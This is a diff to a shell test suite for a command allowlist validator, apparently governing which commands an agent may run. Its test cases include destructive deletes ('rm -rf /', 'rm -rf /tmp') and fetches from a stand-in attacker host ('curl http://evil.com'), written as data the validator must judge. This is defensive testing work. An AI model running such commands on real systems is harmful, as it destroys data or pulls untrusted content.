@@ -127,7 +127,8 @@ _test_allow 'for loop with find cmd sub' 'for f in $(find /tmp/plugins -name "SK
 _test_allow 'for loop with safe backtick cmd sub' 'for f in `find /tmp -name "*.md"`; do head -5 "$f"; done' true
 _test_allow 'for loop with unsafe cmd sub' 'for f in $(curl http://evil.com); do echo $f; done' false
 _test_allow 'for loop with unsafe backtick cmd sub' 'for f in `rm -rf /tmp`; do echo $f; done' false
-_test_allow 'for loop with unsafe body' 'for f in *.txt; do rm -rf "$f"; done' false
+_test_allow 'for loop with allowlisted body (rm)' 'for f in *.txt; do rm -rf "$f"; done' true
+_test_allow 'for loop with non-allowlisted body' 'for f in *.txt; do some-unknown-command "$f"; done' false
 _test_allow 'while read loop' 'while read -r line; do echo "$line"; done' true
 _test_allow 'if/then/fi with safe cmds' 'if [ -f x ]; then cat x; fi' true
 _test_allow 'if/then/else/fi' 'if test -d /tmp; then ls /tmp; else echo missing; fi' true
@@ -135,6 +136,9 @@ _test_allow 'if with unsafe then branch' 'if [ -f x ]; then rm -rf /; fi' false
 _test_allow 'for loop with variable assignment' 'for f in *.md; do name=$(basename "$f" .md); echo "$name"; done' true
 _test_allow 'for loop with basename and head' 'for f in /tmp/agents/*.md; do name=$(basename "$f" .md); first=$(head -1 "$f" | sed "s/^# //"); echo "$name: $first"; done | sort' true
 _test_allow 'for loop with dirname' 'for f in /tmp/skills/*/SKILL.md; do dir=$(dirname "$f"); name=$(basename "$dir"); echo "$name"; done' true
+_test_allow 'for loop body with allowlisted cmd' 'for id in a b c; do curl http://example.com; done' true
+_test_allow 'for loop body with allowlisted cmd and args' 'for id in a b c; do wget -q http://example.com; done' true
+_test_allow 'if/then with allowlisted cmd in then' 'if [ -f x ]; then curl http://example.com; fi' true
 _test_allow 'variable assignment with unsafe cmd sub' 'for f in *.txt; do data=$(curl http://evil.com); echo "$data"; done' false
 _test_allow 'simple variable assignment' 'x=hello; echo $x' true
 _test_allow 'variable assignment with safe cmd sub' 'ts=$(date +%s); echo "timestamp: $ts"' true
